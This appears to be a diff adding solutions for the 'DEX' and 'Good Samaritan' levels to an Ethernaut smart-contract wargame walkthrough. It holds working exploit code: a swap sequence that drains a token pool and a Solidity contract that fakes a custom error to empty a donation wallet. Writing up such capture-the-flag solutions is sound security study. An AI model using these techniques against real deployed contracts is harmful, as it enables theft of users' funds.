@@ -536,7 +536,53 @@ await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
 
 ===> submit level
 
+### DEX
+```
+await contract.approve(contract.address, 500)
+t1 = await contract.token1()
+t2 = await contract.token2()
+await contract.swap(t1, t2, 10)
+await contract.swap(t2, t1, 20)
+await contract.swap(t1, t2, 24)
+await contract.swap(t2, t1, 30)
+await contract.swap(t1, t2, 41)
+await contract.swap(t2, t1, 45)
+```
 
+===> submit level
+
+### Good Samaritan
+
+`BadSaritan.sol`
+```
+pragma solidity ^0.8.0;
+
+interface IGoodSamaritan {
+  function requestDonation() external returns (bool enoughBalance);
+} 
+
+contract Attack {  
+  error NotEnoughBalance();
+
+  function pwn(address _addr) external { 
+     IGoodSamaritan(_addr).requestDonation();
+  }
+
+  function notify(uint256 amount) external pure {
+    // only revert on 10 coins
+    if (amount == 10) {
+        revert NotEnoughBalance();
+    } 
+  }
+}
+```
+
+- Deploy the attack contact
+- Copy instace address
+- Click pwn function with param is instance address
+- Confirm transaction
+
+==> Submit level
 
 
 ## [Tip]
